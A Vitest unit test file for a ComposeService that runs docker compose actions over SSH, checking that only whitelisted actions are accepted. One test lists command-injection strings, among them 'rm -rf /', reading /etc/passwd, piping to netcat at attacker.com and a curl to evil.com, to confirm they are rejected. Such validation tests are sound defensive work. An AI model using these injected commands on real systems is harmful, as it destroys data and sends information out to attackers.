import { describe, it, expect, beforeEach, vi } from "vitest";
import { ComposeService } from "./compose.js";
import type { ISSHService, ILocalExecutorService } from "./interfaces.js";
import type { HostConfig } from "../types.js";

describe("ComposeService", () => {
  let ssh: ISSHService;
  let localExecutor: ILocalExecutorService;
  let service: ComposeService;

  beforeEach(() => {
    ssh = {
      executeSSHCommand: vi.fn().mockResolvedValue(""),
      getHostResources: vi.fn().mockResolvedValue({}) as never
    };
    localExecutor = {
      executeLocalCommand: vi.fn().mockResolvedValue("")
    };
    service = new ComposeService(ssh, localExecutor);
  });

  describe("action validation", () => {
    const host: HostConfig = { name: "test", host: "remote.example.com", protocol: "ssh" };

    it("allows valid compose actions", async () => {
      const validActions = ["up", "down", "ps", "logs", "build", "pull", "restart", "stop", "start"];

      for (const action of validActions) {
        await expect(service.composeExec(host, "proj", action)).resolves.toBeDefined();
      }
    });

    it("rejects action with shell metacharacters", async () => {
      const maliciousActions = [
        "up; rm -rf /",
        "up && cat /etc/passwd",
        "up | nc attacker.com 1234",
        "up $(curl evil.com)",
        "up `whoami`"
      ];

      for (const action of maliciousActions) {
        await expect(service.composeExec(host, "proj", action)).rejects.toThrow(/invalid.*action/i);
      }
    });

    it("rejects unknown compose actions", async () => {
      await expect(service.composeExec(host, "proj", "invalidaction123")).rejects.toThrow(/invalid.*action/i);
    });
  });

  it("executes compose commands via SSH service", async () => {
    const host: HostConfig = { name: "test", host: "remote.example.com", protocol: "ssh" };
    await service.composeExec(host, "proj", "ps");
    expect(ssh.executeSSHCommand).toHaveBeenCalled();
  });
});
